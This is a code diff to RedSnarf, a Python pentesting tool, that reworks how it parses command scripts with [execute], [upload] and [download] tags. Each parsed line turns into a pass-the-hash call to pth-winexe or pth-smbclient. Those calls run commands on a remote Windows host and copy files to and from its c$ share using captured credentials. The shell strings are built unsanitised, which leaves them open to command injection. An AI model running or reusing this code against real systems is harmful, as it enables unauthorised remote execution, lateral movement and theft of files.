@@ -1118,27 +1118,84 @@ def datadump(user, passw, host, path, os_version):
 			if xscript!='n':
 				try:
 					print colored("[+]Running Command Script: "+xscript,'green')
-					
+
+					#[upload]destdir=,localpath=,localfile=
+					#[download]remotedir=,remfile=
+					#[execute]command=
+
 					fo=open(xscript,"r").read()
 					for line in fo.splitlines():
 						
-						if line[0:8]=="execute=":
-							command=line[8:len(line)]
-							print colored("[+]Executing Command ",'yellow')+command
-							os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
-						elif line[0:7]=="upload=":
-							upload=line[7:len(line)]
-							print colored("[+]Uploading ",'yellow')+upload
-							os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put "+upload+"\' 2>/dev/null")
-						elif line[0:9]=="download=":
-							download=line[9:len(line)]
-							print colored("[+]Downloading ",'yellow')+download
-							os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+download+"\' 2>/dev/null")
+						if line[0:9]=="[execute]":
+						
+							command=line[9:len(line)]
+						
+							if command[0:8]=="command=":
+								command=command[8:len(command)]
+								print colored("[+]Executing Command ",'yellow')+command
+								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+						
+						elif line[0:8]=="[upload]":
 							
-							if os.path.isfile(outputpath+host+"/"+download):
-								print colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+download
+							upload=line[8:len(line)]
+							
+							#Quick check for parameters
+							upload=upload.split(",")
+							if len(upload)!=3:
+								print "[!]Missing parameters, [upload]destdir=,localpath=,localfile= "
+								sys.exit()
 
-				except:
+							destdir=upload[0]
+							if destdir[0:8]=="destdir=":
+								destdir=destdir[8:len(destdir)]
+								
+							localpath=upload[1]
+							if localpath[0:10]=="localpath=":
+								localpath=localpath[10:len(localpath)]
+								
+							localfile=upload[2]
+							if localfile[0:10]=="localfile=":
+								localfile=localfile[10:len(localfile)]
+															
+							if destdir=='none':							
+								print colored("[+]Uploading ",'yellow')+localfile
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
+							else:
+								print colored("[+]Uploading ",'yellow')+localfile
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+destdir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
+
+						elif line[0:10]=="[download]":
+							
+							download=line[10:len(line)]
+							
+							#Quick check for parameters
+							download=download.split(",")
+							if len(download)!=2:
+								print "[!]Missing parameters, [download]remotedir=,remfile= "
+								sys.exit()
+
+							remotedir=download[0]
+							if remotedir[0:10]=="remotedir=":
+								remotedir=remotedir[10:len(remotedir)]
+								#print remotedir
+
+							remfile=download[1]
+							if remfile[0:8]=="remfile=":
+								remfile=remfile[8:len(remfile)]
+								#print remfile
+														
+							if remotedir=='none':
+								print colored("[+]Downloading ",'yellow')+remfile
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
+							else:
+								print colored("[+]Downloading ",'yellow')+remfile
+								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+remotedir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
+							
+							if os.path.isfile(outputpath+host+"/"+remfile):
+								print colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+remfile
+
+				except Exception as e:
+					print e
 					print colored("[-]Something went wrong ...",'red')
 					logging.error("[-]Something went wrong running custom command")
 
@@ -2033,7 +2090,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4z", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5a", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
